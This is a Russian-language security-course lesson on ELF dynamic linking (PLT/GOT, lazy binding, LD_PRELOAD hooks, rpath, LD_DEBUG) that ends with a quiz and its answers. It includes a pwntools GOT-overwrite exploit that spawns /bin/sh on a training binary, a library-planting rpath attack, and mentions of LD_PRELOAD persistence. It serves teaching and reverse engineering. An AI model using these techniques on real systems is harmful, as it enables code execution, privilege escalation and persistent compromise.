---
id: reversing-dynamic-linking
title: "Динамическая линковка: PLT/GOT, загрузчик, символы"
category: reversing
parent: reversing-static-tools
difficulty: medium
order: 1
tags: [reversing, plt, got, dynamic-linking, ld, ld_preload, relocation]
prerequisites: [reversing-static-analysis]
useful_for:
  - "CTF Reversing"
  - "Анализ malware (hook, инъекции)"
  - "Патчинг и перехват функций"
estimated_minutes: 50
summary: "Как программа вызывает функции из библиотек: PLT/GOT, релокации, ld.so, перехват через LD_PRELOAD."
---
**Динамическая линковка** — фундамент понимания ELF-бинарников: как программа находит функции в разделяемых библиотеках, почему существует PLT/GOT, и как это эксплуатируется. Без этого не разобрать `ret2dlresolve`, GOT-overwrite, `LD_PRELOAD`-хуки и поведение загрузчика. Урок разбирает механику от начала до конца: структуры ELF, ленивое связывание, `ld.so`, перехват символов, эксплуатационные следствия и полный разобранный пример GOT-overwrite.

## Зачем понимать динамическую линковку

- **Реверс.** Вызов `printf` в дизассемблере идёт через PLT-заглушку; чтобы понять поток, нужно знать, как резолвится адрес.
- **Эксплуатация.** GOT-write, `ret2dlresolve`, перехват функций — всё опирается на линковку.
- **Отладка.** «Почему символ не найден», `LD_PRELOAD` не сработал, неверный `rpath` — типовые проблемы.
- **Хукинг.** `LD_PRELOAD`, Frida-gadget, e9patch перехватывают именно динамические вызовы.

## Как работает динамическая линковка

Программа не содержит кода `libc` — она ссылается на символы, которые **разрешает загрузчик** `ld-linux.so` (`ld.so`) во время запуска или при первом вызове. Ключевые структуры ELF:

- **`.dynsym`** — таблица динамических символов (импортируемые/экспортируемые).
- **`.dynstr`** — строки имён символов.
- **`.rela.plt`** / **`.rela.dyn`** — релокации: что и куда подставить.
- **`.plt`** — Procedure Linkage Table: заглушки для вызовов.
- **`.got`** / **`.got.plt`** — Global Offset Table: ячейки с адресами функций/данных.
- **`.dynamic`** — массив тегов, описывающий, что нужно загрузчику.

```bash
readelf -d ./target | head -20
# (NEEDED) Shared library: [libc.so.6]
# (PLTGOT) 0x404000
# (INIT) 0x401000
readelf -r ./target | head
```

## PLT и GOT: механика ленивого связывания

Изначально ячейка GOT для `printf` указывает **обратно на PLT-заглушку**, которая вызывает резолвер `_dl_runtime_resolve`. После первого вызова в GOT записывается **реальный адрес** `printf`, и последующие вызовы идут напрямую.

```asm
# пример PLT-заглушки (x86-64, PIE)
printf@plt:
    jmp    QWORD PTR [rip+0x2f00]   # -> *printf@got
    push   0x0                       # индекс релокации
    jmp    .plt0                     # -> резолвер
```

При первом вызове `jmp` ведёт в `.plt0`, который сохраняет контекст и вызывает `_dl_runtime_resolve(link_map, reloc_index)`. Резолвер ищет символ, пишет адрес в GOT и передаёт управление функции.

```bash
objdump -d -j .plt ./target
objdump -R ./target        # таблица релокаций (GOT)
gdb -q ./target -ex 'start' -ex 'x/gx 0x404018' -ex 'x/gx 0x404018'
```

## Разбор .dynamic, .dynsym, .rela.plt

```bash
# теги .dynamic: какие библиотеки нужны, где GOT
readelf -d ./target
# символы и их привязка
readelf --dyn-syms ./target | head
# релокации: R_X86_64_JUMP_SLOT (PLT) и R_X86_64_GLOB_DAT
readelf -r ./target
```

Пример вывода релокаций:

```
Relocation section '.rela.plt' at offset 0x620:
  Offset          Info           Type           Sym. Value    Sym. Name
  000000404018  000200000007 R_X86_64_JUMP_SLOT 0000000000000000 printf@GLIBC
```

`R_X86_64_JUMP_SLOT` — это «ленивый» вызов (через PLT); `R_X86_64_GLOB_DAT` — прямой адрес глобальной функции/данных.

## LD_PRELOAD и перехват символов

`LD_PRELOAD` заставляет загрузчик подгрузить вашу `.so` **раньше** системных, и её символы перекрывают `libc`:

```bash
cat > hook.c <<'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
int strcmp(const char *a, const char *b) {
    fprintf(stderr, "strcmp(%s, %s)\n", a, b);
    return 0;
}
EOF
gcc -shared -fPIC -o hook.so hook.c
LD_PRELOAD=$PWD/hook.so ./target
```

Работает только для **динамически слинкованных** вызовов, идущих через PLT. Если бинарник статический или вызов инлайнится — не сработает.

## LD_LIBRARY_PATH, rpath и runpath

Загрузчик ищет библиотеки в порядке: `DT_RPATH` → `LD_LIBRARY_PATH` → `DT_RUNPATH` → `ldconfig`-кэш → системные пути. `rpath`/`runpath` могут быть **относительными** (`$ORIGIN`), что создаёт возможность подмены библиотеки.

```bash
readelf -d ./target | grep -E 'RPATH|RUNPATH'
# (RUNPATH) Library runpath: [$ORIGIN/libs]
# атака: положить свою libc.so.6 в $ORIGIN/libs
patchelf --set-rpath '$ORIGIN/libs' ./target
patchelf --print-rpath ./target
```

Это классический вектор «DLL hijacking» в Linux — если бинарник ищет библиотеку по относительному пути и каталог writable.

## Разобранный пример: как резолвится символ (с выводом)

**Шаг 1. Посмотреть начальный GOT.**

```bash
gdb -q ./target
(gdb) start
(gdb) x/gx &printf@got.plt
0x404018 <printf@got.plt>: 0x0000000000401036   # -> printf@plt+6
```

**Шаг 2. Вызвать `printf` и снова посмотреть GOT.**

```bash
(gdb) continue
(gdb) x/gx &printf@got.plt
0x404018 <printf@got.plt>: 0x00007ffff7e3b1e0   # -> реальный printf в libc
```

**Шаг 3. Вывод.** До первого вызова GOT ведёт в PLT (ленивое связывание); после — напрямую в `libc`. Отключить ленивость можно `LD_BIND_NOW=1` или флагом `-Wl,-z,now`.

## Эксплуатационные следствия

- **GOT overwrite.** Если есть произвольная запись (форматная строка, heap-баг), можно перезаписать ячейку GOT на `system` — и следующий вызов функции даст shell.
- **`ret2dlresolve`.** Без утечки libc: подделываем структуры релокации и заставляем резолвер разрешить `system`.
- **Перехват через `LD_PRELOAD`.** Для реверса/тестирования — подмена функций.
- **Partial RELRO / Full RELRO.** Full RELRO (`-Wl,-z,relro,-z,now`) делает GOT read-only и убивает GOT-overwrite.

```bash
checksec --file=./target
# RELRO: Full RELRO  ->  GOT только для чтения
```

## Разобранный пример: GOT-overwrite на учебном бинарнике

Дано: форматная строка + вызов `exit` в конце.

**Шаг 1. Найти адреса.**

```bash
readelf -r ./vuln | grep -E 'exit|printf'
objdump -R ./vuln | grep exit
# exit@got = 0x404040, system = <libc>+0x...
```

**Шаг 2. Перезаписать GOT `exit` на `system`** (через `%n`):

```python
from pwn import *
p = process("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# ... утечка libc через %p ...
target = 0x404040
payload = fmtstr_payload(6, {target: libc.sym["system"]})
p.sendline(payload + b"/bin/sh")
p.interactive()
```

**Шаг 3. Вывод.** При вызове `exit` управление уходит в `system("/bin/sh")` — shell получен. Это ядро техники GOT-overwrite, полностью основанной на понимании линковки.

## Инструменты и их флаги

| Инструмент | Назначение | Пример |
|---|---|---|
| `readelf -d` | теги `.dynamic` | `readelf -d bin` |
| `readelf -r` | релокации | `readelf -r bin` |
| `objdump -R` | таблица GOT | `objdump -R bin` |
| `objdump -d -j .plt` | PLT-заглушки | `objdump -d -j .plt bin` |
| `patchelf` | правка rpath/интерпретатора | `patchelf --set-rpath .. bin` |
| `ldd` | зависимости | `ldd bin` |
| `LD_DEBUG=bindings` | трассировка резолва | `LD_DEBUG=bindings ./bin` |

## Частые ошибки и подводные камни

- **`LD_PRELOAD` на статическом бинарнике** — молча не работает.
- **Инлайн-функции.** `-O2` инлайнит `strcmp`/`memcpy`; перехвата по символу нет.
- **Full RELRO.** GOT read-only — GOT-overwrite невозможен; ищите другие цели.
- **PIE.** Адреса рандомизированы; нужен leak базы.
- **Забыть про `.got.plt` vs `.got`.** Ленивые вызовы — в `.got.plt`; данные — в `.got`.
- **Неверный порядок поиска.** `LD_LIBRARY_PATH` перекрывает `rpath` только при отсутствии `RUNPATH`.

## Что дальше / решение

Освойте цепочку: **`.dynamic` → `.dynsym` → `.rela.plt` → `.plt`/`.got` → резолвер** — и вы поймёте любой динамический вызов. Для реверса — `LD_PRELOAD`/`LD_DEBUG`; для эксплуатации — GOT-overwrite и `ret2dlresolve`. Дальше — `pwn-ret2dlresolve`, `pwn-got-overwrite` и `reversing-elf-instrumentation` (хуки на уровне линковки).

## LD_DEBUG: живая трассировка загрузчика

Самый недооценённый инструмент — переменная `LD_DEBUG`, которая заставляет `ld.so` печатать каждый шаг резолва. Это позволяет увидеть, откуда именно берётся символ и в каком порядке ищутся библиотеки.

```bash
LD_DEBUG=libs ./target 2>&1 | head -30      # какие библиотеки грузятся и откуда
LD_DEBUG=bindings ./target 2>&1 | grep printf   # куда привязался символ
LD_DEBUG=symbols ./target 2>&1 | head          # поиск символов
LD_DEBUG=all ./target 2>debug.log              # всё (очень многословно)
```

Типичный вывод `bindings`:

```
binding file ./target [0] to /lib/x86_64-linux-gnu/libc.so.6 [0]: normal symbol `printf'
```

Это прямо показывает, **из какой библиотеки** загружен символ — незаменимо, когда `LD_PRELOAD` «не сработал» (значит, вызов инлайнился или символ взят из другого места). `LD_DEBUG=libs` также показывает порядок и результат поиска по `rpath`/`LD_LIBRARY_PATH`/кэшу.

## Версионирование символов и symbol versioning

Символы в glibc версионированы (`printf@GLIBC_2.2.5`). Это влияет на резолв и на эксплуатацию.

```bash
readelf -V ./target | head -30      # таблица версий
objdump -T ./lib/x86_64-linux-gnu/libc.so.6 | grep ' printf'
# printf  GLIBC_2.2.5
```

Версионирование позволяет одной библиотеке содержать несколько реализаций символа. Для хукинга это важно: ваш `LD_PRELOAD`-`printf` должен экспортировать ту же версию, иначе может не перехватить вызов. Иногда приходится использовать `.symver` в ассемблере, чтобы указать версию.

## Практика: перехват с сохранением оригинала

Простой `LD_PRELOAD`-хук часто ломает программу, потому что не вызывает оригинал. Правильный паттерн — `dlsym(RTLD_NEXT, ...)`:

```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>

int strcmp(const char *a, const char *b) {
    static int (*real)(const char*, const char*) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "strcmp");
    fprintf(stderr, "[hook] strcmp(%s, %s)\n", a, b);
    return real(a, b);      // вызвать оригинал
}
```

`RTLD_NEXT` возвращает следующий символ в цепочке загрузки — то есть настоящий `libc`-`strcmp`. Без этого ваша подмена либо зациклится, либо изменит поведение. Для `malloc`/`free` хуки особенно чувствительны: рекурсия внутри `dlsym` может привести к deadlock, поэтому используют статический буфер или `__libc_malloc`.

## Динамическая линковка в отладке: gdb-команды

```bash
gdb -q ./target
(gdb) info sharedlibrary          # какие .so загружены и по каким адресам
(gdb) info symbol 0x7ffff7e3b1e0  # какой это символ
(gdb) p (void*)printf             # адрес printf
(gdb) x/4i printf                 # дизассемблировать
(gdb) set disable-randomization off   # проверить поведение с ASLR
```

`info sharedlibrary` показывает базовые адреса загруженных библиотек — основа для вычисления смещений libc при эксплуатации. При PIE база бинарника тоже рандомизируется; в gdb её видно через `info proc mappings`.

## Квиз

```quiz
- question: "Что содержит GOT?"
  options:
    - "Код функций библиотеки"
    - "Адреса внешних функций, заполняемые загрузчиком"
    - "Список строк"
    - "Точку входа"
  answer: 1
- question: "Что делает lazy binding?"
  options:
    - "Разрешает все символы при компиляции"
    - "Разрешает адрес функции только при первом вызове"
    - "Отключает ASLR"
    - "Шифрует PLT"
  answer: 1
- question: "Почему `LD_PRELOAD` перехватывает `strcmp`?"
  options:
    - "Предзагруженная библиотека ищется в списке символов раньше libc"
    - "Он патчит GOT"
    - "Он пересобирает бинарник"
    - "Он отключает динамическую линковку"
  answer: 0
- question: "Какой флаг checksec делает GOT read-only?"
  options:
    - "Canary"
    - "NX"
    - "Full RELRO"
    - "PIE"
  answer: 2
- question: "Какая команда безопасно покажет нужные библиотеки бинарника?"
  options:
    - "`ldd ./target` (на недоверенном файле)"
    - "`objdump -p ./target | grep NEEDED`"
    - "`strings ./target`"
    - "`nm ./target`"
  answer: 1
```

## Где пригодится

- **CTF Reversing:** перехват сравнений через LD_PRELOAD, понимание адресов в GOT.
- **Pwn:** GOT-overwrite, ret2plt, ret2dlresolve опираются ровно на эту механику.
- **Malware analysis:** hooking-техники, подмена библиотек, анализ инъекций.
- **Пентест Linux:** privilege escalation через writable rpath/библиотеки, persistence через LD_PRELOAD.
- **Работа (RE/разработка):** отладка «library not found», конфликты версий, аудит зависимостей.
